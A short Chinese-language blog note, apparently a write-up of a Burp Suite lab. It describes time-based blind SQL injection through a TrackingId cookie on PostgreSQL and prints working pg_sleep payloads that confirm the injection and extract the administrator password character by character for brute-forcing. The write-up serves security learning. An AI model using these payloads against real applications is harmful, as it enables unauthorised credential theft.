BurpSuite的lab质量真的挺不错，顺带还有YouTube的视频可以教我BP的功能，目前感觉BP应该会陪伴自己很长的一段时间

SQL注入也可以配合SQLmap开扫，虽然工具的效果一般还慢

注入点在登录的界面，登录界面bp抓包注意到有一个cookie

```shell
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
```

然后这里是cookie注入，至于为什么是POSTGRESQL，我也不知道呀

然后尝试注入点

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

```

发现有延时，于是确定注入

然后开始逐步确定

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

```

开始确定密码的位数

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

然后即可用bp爆破获得密码（这里也可以用python),竟然还看到用shell脚本的一位勇士

然后即可注出结果